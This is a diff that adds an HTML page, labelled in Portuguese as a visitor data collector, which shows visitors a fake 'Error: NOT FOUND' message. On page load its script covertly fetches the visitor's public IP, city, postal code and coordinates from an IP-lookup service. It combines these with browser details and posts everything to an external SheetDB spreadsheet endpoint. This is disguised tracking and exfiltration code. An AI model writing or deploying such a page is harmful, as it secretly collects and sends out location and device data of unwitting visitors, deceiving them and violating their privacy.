@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Coletor de Dados de Visitantes</title>
+</head>
+<body>
+<h1>Error: NOT FOUND</h1>
+
+<script>
+async function getIPandLocation() {
+  try {
+    const response = await fetch('https://ipwhois.app/json/');
+    const data = await response.json();
+    return {
+      country: data.country,
+      region: data.region,     // nome da região
+      city: data.city,         // cidade
+      postal: data.postal,     // código postal
+      lat: data.latitude,      // latitude
+      lon: data.longitude,     // longitude
+      ip: data.ip              // ip público
+    };
+  } catch(e) {
+    console.error('Erro ao obter IP/localização:', e);
+    return {};
+  }
+}
+
+function getBrowserInfo() {
+  return {
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    screenWidth: window.screen.width,
+    screenHeight: window.screen.height,
+    timestamp: new Date().toISOString()
+  };
+}
+
+async function sendDataToSheet(collectedData) {
+  const sheetDbUrl = 'https://sheetdb.io/api/v1/eu5qmx1222j2g';
+
+  try {
+    const response = await fetch(sheetDbUrl, {
+      method: 'POST',
+      headers: { 
+        'Accept': 'application/json',
+        'Content-Type': 'application/json' 
+      },
+      body: JSON.stringify({
+        data: [collectedData]
+      })
+    });
+    const result = await response.json();
+    console.log('Resposta SheetDB:', result);
+  } catch(e) {
+    console.error('Erro ao enviar ao SheetDB:', e);
+  }
+}
+
+async function main() {
+  const ipLocationData = await getIPandLocation();
+  const browserData = getBrowserInfo();
+  const collectedData = {...ipLocationData, ...browserData};
+  await sendDataToSheet(collectedData);
+}
+main();
+
+  
+</script>
+
+</body>
+</html>
